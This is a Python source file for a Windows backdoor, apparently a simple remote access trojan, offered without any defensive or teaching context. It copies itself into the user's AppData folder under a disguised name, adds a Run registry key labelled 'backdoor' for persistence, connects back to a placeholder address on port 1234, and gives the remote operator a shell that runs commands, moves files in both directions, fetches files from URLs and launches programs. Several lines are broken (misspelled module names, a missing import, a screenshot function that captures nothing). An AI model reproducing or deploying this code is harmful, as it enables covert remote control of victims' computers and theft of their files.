#!/usr/bin/python

import socket
import os
import subprocess as subproc
import base64
import requests
import mss
import time
import shutil


def admin_check():
    global admin
    try:
        cheack = os.listdir(os.sep.join([os.environ.get(
            "SystemRoot", "C:\\windows"), "temp"]))
    except:
        admin = "ERROR, insufficient privileges"
    else:
        admin = "Privileges Admin"


def create_persistence():
    location = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(location):
       shutil.copyfile(sys.executable, location)
       subcprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)


def conn():
    while True:
        time.sleep(5)
        try:
            client.connect(("xxx.xxx.x.xxx", 1234))
            shell()
        except:
            conn()


def screen_shot():
    screen = mss.mss()


def download_file(url):
    ask = request.get(url)
    name_file = url.split("/")[-1]
    with open(name_file, 'wb') as file_get:
        file_get.write(ask.content)


def shell():
    curr_dir = os.getcwd()
    client.send(curr_dir)
    while True:
        res = client.recv(1024)
        # Quit of client
        if res == "exit":
            break
        # Change directory
        elif res[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result = os.getcwd()
            client.send(result)
        # Download files
        elif res[:8] == "download":
            with open(res[9:], 'rb') as file_dwn:
                client.send(base64.b64encode(file_dwn.read()))
        # Upload files
        elif res[:6] == "upload":
            with open(res[7:], 'wb') as file_up:
                datos = client.recv(30000)
                file_up.write(base64.b64decode(datos))
        elif res[:3] == "get":
            try:
                download_file(res[4:])
                client.send("File has been dowload right.")
            except:
                client.send("Has been a Error.")
        elif res[:10] == "screenshot":
            try:
                screen_shot()
                with open("screen-1.png", "rb") as file_send:
                    client.send(base64.b64encode(file_send.read()))
                os.remove("screen-1.png")
            except:
                client.send(base64.b64encode("fail"))
        elif res[:10] == "start":
            try:
                subproc.Popen(res[6:], shell=True)
                client.send("Start program success")
            except:
                client.send("Program fail")
        elif res[:5] == "check":
            try:
                admin_check()
                client.send(admin)
            except:
                client.send("It is no allow.")
        else:
            proc = subproc.Popen(
                res, shell=True, stdout=subproc.PIPE, \
                stderr=subproc.PIPE, stdin=subproc.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                client.send("1")
            else:
                client.send(result)


create_persistence()
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn()
client.close()
